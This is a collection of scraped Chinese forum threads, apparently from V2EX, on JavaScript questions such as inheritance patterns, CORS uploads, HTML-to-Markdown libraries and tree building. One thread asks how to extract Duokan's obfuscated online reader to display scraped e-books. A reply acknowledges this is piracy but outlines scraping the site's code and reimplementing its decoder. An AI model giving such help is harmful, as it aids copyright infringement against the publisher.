{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>JavaScript继承主要是两种形式：<br>\n1. 原型链继承<br>\n2. 拷贝继承</p>\n\n<p>注：ES7标准中的class就暂时不考虑了，因为还没有具体去了解过，希望以后能完善到不需要自己实现那么那么蛋疼的东西了。</p>\n\n<p>我个人倾向于原型链继承，因为原型链继承是JavaScript规范里面推荐的继承，并且最重要的是，可以用原生的 instanceof 判断类型！而拷贝继承不行！</p>\n\n<hr>\n\n<p>因为以上的一些问题，所以我就自己做了一个简单的JavaScript面的对象库。大概有实现这么几个功能：<br>\n1. 封装好的构造函数不管写不写new操作符都不会产生错误了，当然我是倾向于不写new操作符。<br>\n2. 返回的构造函数是命名的，方便调试的时候追踪函数栈。<br>\n3. 封装了一个parent方法，可以方便访问父原型的构造函数或者父原型的方法。<br>\n4. 封装了一个alias方法，可以创建一个方法别名。</p>\n\n<p>具体实现在具体实现在github上 &gt;&gt; <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bramblex/loveaira.me/blob/master/www/js/blxclass.js\">代码传送门</a></p>\n\n<p>接下来来看一些简单的示例来看看怎么用。</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// 首先定义一个Animal类（姑且称为类吧），继承自Objec，有一个构造函数。</span>\n<span class=\"kd\">var</span> <span class=\"nx\">Animal</span> <span class=\"o\">=</span> <span class=\"nx\">BlxClass</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span><span class=\"s1\">'Animal'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">sound</span><span class=\"p\">){</span>\n  <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"nx\">name</span> <span class=\"o\">||</span> <span class=\"kc\">null</span><span class=\"p\">;</span>  \n  <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">sound</span> <span class=\"o\">=</span> <span class=\"nx\">sound</span> <span class=\"o\">||</span> <span class=\"kc\">null</span><span class=\"p\">;</span>\n<span class=\"p\">});</span>\n\n<span class=\"nx\">Animal</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">call</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">sound</span><span class=\"p\">);</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// 现在我希望定义一个doge类，继承自Animal。第一个参数 ‘Doge’ 是用来给构造函数命名的。</span>\n<span class=\"kd\">var</span> <span class=\"nx\">Doge</span> <span class=\"o\">=</span> <span class=\"nx\">BlxClass</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span><span class=\"s1\">'Doge'</span><span class=\"p\">,</span> <span class=\"nx\">Animal</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">){</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">sound</span> <span class=\"o\">=</span> <span class=\"s1\">'wang'</span><span class=\"p\">;</span>\n  <span class=\"nx\">BlxClass</span><span class=\"p\">.</span><span class=\"nx\">parent</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">Doge</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">sound</span><span class=\"p\">]);</span> <span class=\"c1\">// 调用父类的构造函数，因为初始化对象属性在父类构造函数里。</span>\n<span class=\"p\">});</span>\n\n<span class=\"nx\">Doge</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">wang</span> <span class=\"o\">=</span> <span class=\"nx\">BlxClass</span><span class=\"p\">.</span><span class=\"nx\">alias</span><span class=\"p\">(</span><span class=\"s1\">'call'</span><span class=\"p\">);</span>\n\n<span class=\"c1\">// 现在实例化一个doge对象</span>\n<span class=\"kd\">var</span> <span class=\"nx\">doge</span> <span class=\"o\">=</span> <span class=\"nx\">Doge</span><span class=\"p\">(</span><span class=\"s1\">'Tom'</span><span class=\"p\">);</span> <span class=\"c1\">// 有没有 new 都没关系，结果相同。</span>\n<span class=\"nx\">doge</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">();</span> <span class=\"c1\">// =&gt;'wang'</span>\n<span class=\"nx\">doge</span><span class=\"p\">.</span><span class=\"nx\">wang</span><span class=\"p\">();</span> <span class=\"c1\">// =&gt;'wang'</span>\n</pre></div>\n\n<p>然后这样就跟其他语言类的继承大致相似了。然后大家更喜欢哪一种继承方式呢？都来说说自己看法吧。</p>\n</div></div>"], "reply": "54", "tittle": "大家喜欢用 JavaScript 中哪一种继承方式？大家来说说自己的看法 OwO", "comment": [" 展开讨论在这里 OwO", "大神 Douglas Crockford 的代码\r", "if ( typeof Object.create !== 'function' ) {\r", "    Object.create = function ( o ) {\r", "        function F() {}\r", "        F.prototype = o;\r", "        return new F();\r", "    };\r", "}\r", " \r", "\r", "这个思路是从一个对象复制出另一个对象，OwO，然后再加工新对象吗？感觉有点坑……", "论茴香豆的茴有几种写法", "我没用到这种专门搞一个继承的方法，js太灵活了，很多问题在c++首先想到继承解决，而在js中奇技淫巧耍耍就解决了。当然，要我写一个继承，首先从原型链上搞起。", " \r", "\r", "茴香豆有几种写法都无所谓，能表意即可。但是对于几种不同继承方式，可远远没有那么简单了。如果只是写写jQuery，那当然无所谓。", " \r", "\r", "有什么好的实现方案吗？我就是从原形链开始搞起的。OwO", " 最简洁的应该是 ES6 的 class-extends-super 这一套语法糖，Nodejs 的 util.inherits 也很好啊。你掌握之后应该就很厉害了，因为你终于知道茴有几种写法了!", "class 的继承方式我记得就是原型继承的语法糖? <求确认", " \r", "\r", "然而我已经实现了类似你所说的那些东西。", " \r", "\r", "不知道哎，如果是原型继承的语法糖，那么坑爹的问题还是依旧存在的……", " 是的，原型链的语法糖\r", "\r", "\r", " 粗略看了下代码\r", "\r", "1. 为何要用 eval，似乎只是为了处理 name 是个字符串，虽然这玩意不一定evil，但是代码可读性就很差。\r", "\r", "2. child 的 prototype.constructor 没有处理？直接 new 了 parent\r", "\r", "3. Backbone 的那个 extend 不是更好的方案？", " \r", "\r", "1. eval 是两个作用：\r", "    1.1. 命名。如果没有命名在chrome下输出的东西太难看了，受不了。虽然不命名也可以。\r", "    1.2. 没有办法 new func.apply(this, args)，所以只能事先把从constructor里面读出来有几个参数，然后用arguments[0], arguments[1] ....这样写进去。\r", "\r", "2. childe 的 prototype 直接 new 了 parent。然而是会出点问题，现在马上解决掉。\r", "\r", "3. Backbone那么个方案我没看过……但是不能光会用别人的东西嘛，对吧。", "在 JavaScript 里仿 Class 的都是异端！\r", "\r", "ES5之前：\r", "var o = { foo:bar, proto: p };\r", "\r", "ES5加了：\r", "var o5 = Object.create(p);", " \r", "\r", "然而我就是异端 /w\\ 。因为真心比原型继承好用，总感觉原型继承是半残的……其实只要达到目的，无所谓什么异端不异端啦", "我在公司做的class系统是原型链继承，还算好用吧。\r", "\r", "对于构造函数没加new这个我以前是赞成不写也new出来的做法，不过现在不赞成了，如果新做一个我一定要抛异常。原因很简单：我不希望做一件事情有多种不一样的做法，如果大家做法一样的话，重构或者静态代码分析都会简单很多，这对于大规模协同开发很重要（jQ是反例）。\r", "\r", "我在这个之上还做了destroy方法，这个方法会自动迭代调用父类的destroy方法，并会清空对象成员，保证已销毁对象在大多数情况下使用会崩溃，以第一时间找到问题点。", " \r", "\r", "很有道理啊！", "JJ的思念", " 快说，你是哪个基佬？", "借鉴一下把\r", "\r", "var extend = function(protoProps, staticProps) {\r", "    var parent = this;\r", "    var child;\r", "\r", "    // The constructor function for the new subclass is either defined by you\r", "    // (the \"constructor\" property in your `extend` definition), or defaulted\r", "    // by us to simply call the parent constructor.\r", "    if (protoProps && _.has(protoProps, 'constructor')) {\r", "      child = protoProps.constructor;\r", "    } else {\r", "      child = function(){ return parent.apply(this, arguments); };\r", "    }\r", "\r", "    // Add static properties to the constructor function, if supplied.\r", "    _.extend(child, parent, staticProps);\r", "\r", "    // Set the prototype chain to inherit from `parent`, without calling\r", "    // `parent` constructor function.\r", "    var Surrogate = function(){ this.constructor = child; };\r", "    Surrogate.prototype = parent.prototype;\r", "    child.prototype = new Surrogate;\r", "\r", "    // Add prototype properties (instance properties) to the subclass,\r", "    // if supplied.\r", "    if (protoProps) _.extend(child.prototype, protoProps);\r", "\r", "    // Set a convenience property in case the parent's prototype is needed\r", "    // later.\r", "    child.__super__ = parent.prototype;\r", "\r", "    return child;\r", "};\r", "\r", "// 如何用\r", "\r", "var BaseObject = function() {};\r", "\r", "BaseObject.extend = extend;\r", "\r", "var Dog = BaseObject.extend({\r", "  call: function() {}...\r", "});\r", "\r", "//当然，new是必须的\r", "\r", "var dog = new Dog", "v2ex 的回复不支持 markdown 真讨厌\r", "\r", "是我的理解有问题吗？原型继承不就是指所有的新对象都是靠拷贝原型来的嘛？楼主你提这两个东西在底层真的有很大的区别吗？你确定不是跟class一样是个语法糖？", " \r", "\r", "这个不是你理解有问题，而是……你基本概念不清晰……", " 若是可以的话，我想知道是如何划分这两种继承方式，因为我在网上也找不到“拷贝继承”这基本概念，翻GoF里面也没见过。看mdn都是说的是原型链继承", " 我理解的 @", " 所谓的拷贝继承应该就是 mixin，不知道对不对。可问题是 ... mixin 根本就不是继承啊！", " \r", "\r", "\r", "\r", "首先，拷贝继承是mixin没错了。但是你好像对继承的概念理解有些问题……", " \r", " \r", "\r", "不对，拷贝继承不是mixin……或者只能说有些时候mixin是拷贝继承的一个步骤而已……\r", "\r", "没必要写javascript了，可以写其他语言再transcompile成javascript就行了。", " 嗯，等我先把JavaScript折腾到极致了我再去转coffee，type之类的好了。不过我觉得应该折腾不到机制 OwO。因为折腾完了JavaScript语言本身，还有v8可以折腾", " java、c/c++、php、objective-c、c#都可以翻译成javascript，没有必要折腾coffee，type之类的了。", " 前几天发现几乎所有语言都可以transcompile成javascript，看来不知有多少人对javascript不满啊！", " 莫与在人间 2333", "各有各的用处吧。\r", "《Javascript高级程序设计 第三版》中 6.3.4 ‘原型式继承’ 一节中提到\r", "“他（Douglas Crockford）的想法是借助原型可以基于已有的对象创建新对象，同时还不必因此创建自定义类型”，\r", "“ECMAScript5通过新增Object.create()方法规范了原型式继承”。\r", "所以我理解为如果想继承一个对象的同时又不想创建自定义类型的时候可以使用‘原型式继承’，其他的时候应该考虑‘寄生组合式继承’。", "  JavaScript有问题，但是不能否认JavaScript各种很好的特性。比如函数式的特性，比如闭包等等。\r", "\r", "至于有那么多语言翻译成JavaScript，只能说明JavaScript火了。然后那些并不了解JavaScript又不想学习的人开始需要用自己熟悉的语言来实现JavaScript的项目了。\r", "\r", "但是当然啦，JavaScript这货虽然有很多优秀的特性，但是坑也是一堆一堆的。说的难听点，JavaScript现在还根本就是断手断脚的残缺品嘛…… TnT", " 我觉得你说的拷贝继承根本不能算是继承。所以才提出JS里面有继承也就是原型继承的论调。这个所谓的拷贝继承根本就是原型继承的那套思想，但是实现却用浅拷贝，我觉得只能算是一种实现方式，按道理实现原型拷贝要用深拷贝才对，浅拷贝的话，你修改子类对象一样会修改到父类对象，这样的效果就明显跟继承的初衷不符，跟OO思想不符。", " ", " \r", "\r", "没错，就是继承的实现方式…仅此而已…", "原型呀。。。\r", "\r", "之前面试，我直接甩了 util.inherits 源码 ", "首先，class 是 ES6 标准不是 ES7", " 手抖写错了，然后并不能改……", "我建议使用ES6的class关键字和babel", " \r", "\r", "谢谢。然而我的目的并不是要别人告诉我用什么工具，我的目的是自己实现一个。类似babel这类的complier之后我也会自己实现一个。反正作为学生党，我觉得玩玩也挺有意思的。", "我觉得讨论这么多，都老是想用类的继承来写 javascript，然而 js 中的原型机制根本就不是类的机制，而是能够模拟实现类的机制。\r", "所以要怎么用就怎么写，需要查找原型链那么就直接将 new function 的 prototype 直接等于被继承对象的 prototype。希望被继承对象不会被修改就深复制其 prototype 作为新对象的 prototype。\r", "比如我在自己的项目中需要的只是原型链的查询实现变量作用域的嵌套\r", "\r", "所以用大神 Douglas Crockfor 的代码就够了。", " \r", "\r", "但是为什么不能总是想着类继承来些JavaScript呢？类继承机制在绝大多数情况下确实比原型机制更直观也更好用。其实为什么一定要拘泥于语言本身所谓“够了”的特性，而不能追求更直观更方便更强大的特性呢？\r", "\r", "我觉得永远都没有什么 xxxx 就够了这么一说。", " \r", "看清楚我的表达，什么什么就够了是有条件的，不要歪曲了。不用原型链而非要用其模拟类继承并非不可以，然而若写简洁的代码就能完成任务为什么还要增其实体？\r", "另外，我不认为“类继承机制在绝大多数情况下确实比原型机制更直观也更好用”，那是可能因为你先学了 OOP 而已。\r", "而你所谓的“更直观更方便更强大的特性”也只是主观因素。\r", "我也没有认为 js 超越其他语言，因为<del>PHP才是最好的语言</del>。我只是想说 js 的原型链能解决，就不要用类继承了。\r", "当然如果你只写ES6，我无话可说。", " \r", "\r", "如果js原型链能解决？嗯，那请问，在计算机上有什么能够用0和1解决呢？既然能解决，那干嘛还需要语言？\r", "\r", "问题不是能不能解决，而是能不能更好的解决，尽量避免重复，尽量避免接触丑陋的底层细节，而不是“能解决”。\r", "\r", "抱歉，我觉得我们还是就此打断这种毫无意义的价值观争端吧。欢迎讨论技术问题", " \r", "貌似价值观问题是你先提出的\r", "“问题不是能不能解决，而是能不能更好的解决”。我就一句话，js 上用原型链比类继承更“尽量避免重复，尽量避免接触丑陋的底层细节，而不是“能解决”。 ”\r", "在想如何用类的时候你已经自我矛盾了。", " \r", "\r", "然而只有论点却没有论据……", " \r", "\r", "所以还是就此打住吧，别让这种没有营养的口水战继续下去了好吗？自始至终你根本拿不出任何证据来支撑你的论点——原形链继承比类继承好。同样的，我根本也找不出任何证据来反驳你。所以我们能不讨论这种圣战性质的谁比谁好的问题吗？\r", "\r", "所以我们能单纯的讨论原形链继承和类继承分别有啥好有啥不好不行吗？如果不好，那我只能说一句了，PHP是最好的编程语言。", " \r", "行，本来打算继续补充，怕你已经 block 了我所以没发。\r", "1、原型链本身就是原生的方式，js 本身并不支持类继承，写类的 polyfill 本身就是强行加细节。\r", "2、原型链机制在最少代码情况下用之前我贴出的代码就 ok，相反你看类继承包括你在内建了多少楼？又用了多少代码？\r", "我也只是呼吁一下 js 有其独特的方式，写的时候多运用，而不要老想着上其他语言的那一套而已。\r", "我在写 node 的时候觉得 inherit 也是很好的，但反对所有地方都用。", " \r", "喂喂，分明你自己也没有提出证据全是问句啊……还直接说我了唉……", " \r", " \r", "1. 首先我已经直说了我提不出证据反驳你啊……这个我记得我是清清楚楚写在上面了吧，不然您再仔细看看？\r", "\r", "2. 即便你说的全都对，但是依旧没有证明你所说的“原型链继承比类继承更优”啊。能得出的结论只是我的实现比你多了几十行代码而已。\r", "\r", "3. “我也只是呼吁一下 js 有其独特的方式，写的时候多运用，而不要老想着上其他语言的那一套而已。 ”这句话真的一点意义都没有，不行我反着给你说一遍：\r", "\r", "我也只是呼吁一下大家要多想想其他的解决方案，写的时候多思考，而不要老是被js那一套限制住了思维而已。\r", "\r", "4. 我不反对任何人在任何情况下写任何代码，除非我是他boss。不然我觉得我真的没有任何权力去反对别人写怎么样的代码唉，我能想象我反对别人写怎么样的代码的时候，别人会白我一眼然后淡淡回我一句：管你屁事。", " \r", "1、我说的是更前的地方。43楼我表达了“哪里用什么就ok了没必要硬要用某模式”，44楼你自己说“类继承机制在绝大多数情况下确实比原型机制更直观也更好用。”，并没有提出证据，我说的是这里。之后我提出并非如此你反而要我提证据了。\r", "\r", "2、如果全都对，*在使用 js 情况下*，为什么就没有证明更优？你这种情况不就是尝试在 java 中用原型链的行为不是？\r", "\r", "3、这句话我承认自己脑子的确被驴踢了。\r", "\r", "4、我从来没有指明反对你写什么代码，也承认类继承有其可用之处，你要写 babel 也好写 compiler 也好，管我屁事。难道我在论坛上提出观点也不行了？\r", "\r", "还是打住吧\r", "\r", "虽然说“如果是两个理性而真诚的真理追求者争论问题，争论的结果必然是二人达成一致。”，但是我还有其他事情要做……", " \r", "\r", "我在46楼的时候已经说过要打住了吧……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前用node.js和websocket 做了一个聊天服务器,客户端是运行在 jsp 中的。</p>\n\n<p>重点来了：产品经理要求我聊天功能加入发送图片的功能，这时候问题来了，$.getJSON只是get请求，上传图片get请求满足不了。</p>\n\n<p>请各位支个招，第一次发贴，谢谢大家。</p>\n</div></div>"], "reply": "14", "tittle": "js 跨域该如何解决", "comment": ["呃，你确定一下是跨域问题还是 get or post 问题。", "上传图片构造iframe表单，后台返回的结果加callback参数进行回调 =。=", "你应该弄一个跨域认证", "1.jsonp\r", "2.Access-Control-Allow-Origin:*\r", "\r", "你要post的,那就是方案2了", "是跨域问题，因为node.js是跑在其他服务器，上传图片的接口也是在node.js中的。而jsp是运行在自己本地的。", " 是跨域问题，因为node.js是跑在其他服务器，上传图片的接口也是在node.js中的。而jsp是运行在自己本地的。", "看情况定，如果IE9以上啥的，cors 吧。很好的。", "有一种东西，叫cors", " 我测试过一个，貌似有时是不管用的。cors是不是只能用 外网IP 的接口吧。如果我自己本地测试，是内网的IP，貌似测试不了的。\r", "只能用IE9以上？那完了，我们公司最低IE8", "最近刚解决ajax图片传输跨域的问题，http://www.slideshare.net/SlexAxton/breaking-the-cross-domain-barrier，这里面讲了几种跨域的解决方案。我采用的是CORS，在服务端的response里加入如下包头：\r", "'''\r", "response.setHeader(\"Access-Control-Allow-Origin\", \"你的域名(在测试的时候你可以使用 * )\");\r", "response.setHeader(\"Access-Control-Allow-Methods\", \"POST, GET, OPTIONS, DELETE\");\r", "response.setHeader(\"Access-Control-Max-Age\", \"3600\");\r", "response.setHeader(\"Access-Control-Allow-Headers\", \"x-requested-with\");\r", "'''", "我说说理论上可行的方案，啥浏览器都兼容。只要支持iframe和script\r", "\r", "首先构建一个表单，上传文件的表单，加入一个字段为随机字符，把这个表单post到iframe里，服务器收到文件，在数据库中记录随机字符和图片的地址。\r", "\r", "然后每几秒向图片服务器用jsonp的方式带着那个随机字符查看服务器里是否有这个相关的图片 有的话得到http地址 如果iframe的onload属性可以的话 也可以onload之后再请求\r", "\r", "完 简单有效", "  兄弟感谢，这个方法我火狐、谷歌和IE高版本都测试成功了", " 方案2测试成功，感谢", "cors只能在高级浏览器了"]},
{"content": ["<div class=\"topic_content\">在github上找了一下，大多数都是把markdown语法转换为html，没有找到把html转换为markdown语法的库。\r<br>\r<br>顺便说一下，https://github.com/chjj/marked 写得真好。</div>"], "reply": "9", "tittle": "有什么库，能把 html 转换为 markdown 的语法", "comment": [" 挺多的啊~", "这个快进 The PHP League 库了，Star 数也不少： ", "虽然有很多工具可以做到 html -> markdown，但是我还是要说 md / html 之间的关系更偏向于单向，通过 md 来更好地定义 typography。", "pandoc 各种转。", "to-markdown 亲测可行", "感谢各位，已决定使用to-markdown\r", "\r", "pandoc"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>&lt;a class=\"hover\"/&gt;</p>\n\n<p>因为有hover事件，放上去是有效果的，如何在初始化的时候也有选中效果，换句话说就是 ，初始化的时候 jq如何使他有选中效果</p>\n</div></div>"], "reply": "4", "tittle": "jq 如何初始化 hover 事件", "comment": ["hover 的效果应该用 CSS 实现，不应该借助 JS", ":hover 伪类选择器\r", "\r", "如果是js你说的大概是mouseover吧", "a:hover, a.selected{color:red;}\r", "<a class=\"selected\">link</a>", "难道 trigger('mouseenter') ???"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>根据包名，在指定空间中创建对象 <br>\n输入描述:<br>\n<code><br>\nnamespace({a: {test: 1, b: 2}}, 'a.b.c.d')<br>\n</code></p>\n\n<p>输出描述:<br>\n<code><br>\n{a: {test: 1, b: {c: {d: {}}}}}<br>\n</code><br>\n这个方法怎么写？</p>\n<div class=\"highlight\"><pre>function namespace(oNamespace, sPackage) {\n\n}\n</pre></div>\n</div></div>"], "reply": "3", "tittle": "根据包名，在指定空间中创建对象", "comment": ["写了一个，你把参数颠倒就行了 ", " 非常感谢。\r", "不过 var p = top; 这一句好像可以不用？\r", "直接操作 top ，最后返回 package 也可以吧。", "function namespace(oNamespace, sPackage) {\r", "\tvar temp = oNamespace;\r", "\tsPackage.split('.').forEach(function(i){\r", "\t\ttemp = (typeof temp[i] == 'object' && (i in temp) ? temp[i] : temp[i] = {});\r", "\t});\r", "\treturn oNamespace\r", "}"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">arr</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n    <span class=\"p\">{</span><span class=\"nx\">id</span><span class=\"o\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"nx\">pid</span><span class=\"o\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"SYSTEM\"</span><span class=\"p\">},</span>\n    <span class=\"p\">{</span><span class=\"nx\">id</span><span class=\"o\">:</span><span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"nx\">pid</span><span class=\"o\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"aa\"</span><span class=\"p\">},</span>\n    <span class=\"p\">{</span><span class=\"nx\">id</span><span class=\"o\">:</span><span class=\"mi\">3</span><span class=\"p\">,</span> <span class=\"nx\">pid</span><span class=\"o\">:</span><span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"aaa\"</span><span class=\"p\">},</span>\n    <span class=\"p\">{</span><span class=\"nx\">id</span><span class=\"o\">:</span><span class=\"mi\">4</span><span class=\"p\">,</span> <span class=\"nx\">pid</span><span class=\"o\">:</span><span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"b\"</span><span class=\"p\">},</span>\n    <span class=\"p\">{</span><span class=\"nx\">id</span><span class=\"o\">:</span><span class=\"mi\">5</span><span class=\"p\">,</span> <span class=\"nx\">pid</span><span class=\"o\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"c\"</span><span class=\"p\">},</span>\n    <span class=\"p\">{</span><span class=\"nx\">id</span><span class=\"o\">:</span><span class=\"mi\">6</span><span class=\"p\">,</span> <span class=\"nx\">pid</span><span class=\"o\">:</span><span class=\"mi\">5</span><span class=\"p\">,</span> <span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"cc\"</span><span class=\"p\">}</span>\n<span class=\"p\">];</span>\n\n\n<span class=\"cm\">/*</span>\n<span class=\"cm\">var result = [{</span>\n<span class=\"cm\">        \"name\": \"SYSTEM\",</span>\n<span class=\"cm\">        \"expanded\": true,</span>\n<span class=\"cm\">        \"id\": 0,</span>\n<span class=\"cm\">         \"items\": [</span>\n<span class=\"cm\">                   {</span>\n<span class=\"cm\">                        name: \"Sub\",</span>\n<span class=\"cm\">                       \"expanded\": true,</span>\n<span class=\"cm\">                        \"id\":1,</span>\n<span class=\"cm\">                       \"pid\":0,</span>\n<span class=\"cm\">                       \"items\":[ ......]</span>\n<span class=\"cm\">                   },</span>\n<span class=\"cm\">                   {}</span>\n<span class=\"cm\"> } ];</span>\n<span class=\"cm\">*/</span>\n</pre></div>\n\n<p>遇到这样的就傻眼了，99</p>\n</div></div>"], "reply": "35", "tittle": "js 怎么生成树结构，算法太烂", "comment": ["你在说啥？", " \r", "\r", "```js\r", "生成这样的结构\r", "var datasource = [{\r", "    \"text\": \"null\",//根节点\r", "    \"expanded\": true,\r", "    \"items\": [\r", "        {\r", "            \"text\":\"user1\",//第一个子菜单\r", "            \"expanded\": true,\r", "            \"items\":[\r", "                {\r", "                    \"text\":\"user2\",//二级菜单\r", "                    \"expanded\": true,\r", "                    \"items\":[\r", "                        {\r", "                            \"text\":\"user4\",//三级\r", "                            \"items\":[\r", "                                {\r", "                                \"text\":\"user5\"//四级\r", "                                }\r", "                            ]\r", "                        }\r", "                    ]\r", "                },\r", "                {\r", "                    \"text\":\"user3\",\r", "                }\r", "            ]\r", "        },\r", "    ]\r", "}];\r", "```", "这个事情就不要在前端做了，除非是用nodejs", "楼主，看你的意思好像不知道js里树应该怎么写出来吗~不用这么搞，js里其实也有指针，对象和数组直接引用就是指针。爪机打字太费事，一会给楼主个例子。", "<script src=\"", ".js\"></script>", " 差不多吧，没搞过。问过一些都不懂，好失望", " 没办法，业务分给前端做。还要自己写存储过程拿结果。", "see ", " 为什么不利用 桌面 过剩的算力？\r", "（如果前端渣，导致阻塞的话那另说", " 有点叼哦。5行。", "  额，我看看怎么转成 js.", " 自己移植下 完事", " 前几天也写文件管理也遇到目录树传到前端，参考下重构下自己的代码。", " 找参考实现别死盯着目标语言，有时候找找其他的语言的 移植过来用也不错", " \r", "浏览器是有对脚本运行时间限制的，一般人不会调这个，起码我也是只知道firefox怎么调\r", "如果太多脚本、或者运算时间长，页面就会卡住（引擎好的会报错），用户体验就差了\r", "前端首先要考虑低端配置的客户端，而不是认为客户端必然有“富余”", " 你叫react那种把整个dom做成virtual dom的怎么整", " 同学写的非常好了，我就不写了 :P", "\r", "\r", "核心函数只要三行（然而你需要支持 es6 语法的环境，比如最新的 firefox", " 递归深度太深不会炸？", " \r", "那要看用户群，反正我这台机不敢在浏览器乱按 F12", "var temp = [];\r", "for(var i in arr){\r", "\tarr[i].expanded = true;\r", "\tvar id = arr[i].pid - 1;\r", "\t(id in arr ? (arr[id].items || (arr[id].items = [])) : temp).push(arr[i])\r", "}\r", "console.log(temp);", " 会炸的（但是用 ff 试了，深度要到好几千呢，比如下面这个就不会炸\r", "tree(0, Array.apply(null, new Array(2048)).map((v, i) => { return {id:i+1, pid:i} }))", " 这个原数组会被污染，之前最好用克隆的数组进行。", " \r", "\r", "1. 主流用户\r", "2. 高端用户 建立在主流之上满足用户\r", "3. 低端用户 建立在主流以下满足用户\r", "\r", "先满足主流\r", "如果 低端/主流 用户想得到 主流/高端 的体验请升级\r", "\r", "众口难调 某些用户喜欢在 低端位置 获取 高端体验 这样诉求只能是miss", " \r", "这个就不用跟我说了，我全职做市场调查超过5年，非全职市场分析超过20年", "看看 jstree 找找灵感吧   XD", "一般都是后端干好吧。", "像js这种动态语言，生成树结构不要太方便啊", "看错楼主的表达了，不好意思。", " ", " \r", "我加多一层就报错了？", " 你的用例中id、pid为字符串型，而作者代码判断条件使用===判断的数字型。作者代码中还有一个问题：如果原数组中id排序并非顺序，会出现parent在objMap取空的问题", " 谢谢提醒", " objMap的bug都看出来了，你真仔细。不像某些lz拿来主义", " = = 我也有注意到全等，也是有转类型的，只是不知道为什么不行。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>背景是之前在多看限免时抓过几本书，多看最终的内容是请求一个jsonp文件，获取到内容然后用dkbson.decode解码（看格式像是base64+bson的形式，但base64应付不了这么大的数据），载入多看的各种js（我并不会前端，只是学了一点jQuery的用法，所以就能载入就都载入了）后调用dkbson解码得到一个内容数组，里面将每个字作为一个元素，其中包括位置颜色字号等信息（当然其中有图的话还有图片下载地址等），于是只能勉强将汉字拿出来显示出来，对于小说还可以看的啦。</p>\n\n<p>之余想知道能不能将整个阅读器“抠”出来，载入本地的文件或另一个地址的内容来展示出书原来的样子呢？因为那些js代码是经过混淆的，看着看着就睡着了，所以现在还没什么头绪，到底哪个命令是载入新页，哪个是滚动都不清楚。大家有什么想法么</p>\n</div></div>"], "reply": "4", "tittle": "请问如何将多看的这个在线阅读器移植出来，使得能够读取本地文件或其他的地址内容？", "comment": ["首先，这是盗版的行为；\r", "其次，你可以考虑把整站的 js 全抓回来……", " 我会在24小时内删除的\r", "你说的这个建议太笼统 我是可以把所有js抓下来 然后呢 怎么载入？看源码 咋看 都混淆过了", "把 HTML 和数据也都一起抓下来啊……\r", "然后打开 HTML 不就可以看了……\r", "\r", "然后你自己分析传输的那个 dkbson 然后自己写一个差不多的替换上去就行了。\r", "\r", "总之整个还算比较麻烦。\r", "另外混淆的源码也不是看不懂，格式化+断点可以对付一部分，剩下的靠想象力……", " 发帖5分钟后无法删除"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>xmind 虽然强大，但在win平台下，然而我大ubuntu只用过　freemind,并不怎么好用<br>\nweb端也就这个   <a target=\"_blank\" rel=\"nofollow\" href=\"http://naotu.baidu.com/\">http://naotu.baidu.com/</a>    好用些，ｓｏ，如题？</p>\n</div></div>"], "reply": "5", "tittle": "问个思维导图的工具，有　js 版本的么　～", "comment": ["xmind基于eclipse，跨平台。debian下使用完好。", "xmind 有各种版本啊，我在ubuntu用的就是这个", "  一直以为只有在win下能用呢 /TAT\r", "\r", "  ths,有时间研究下。", "\r"]},
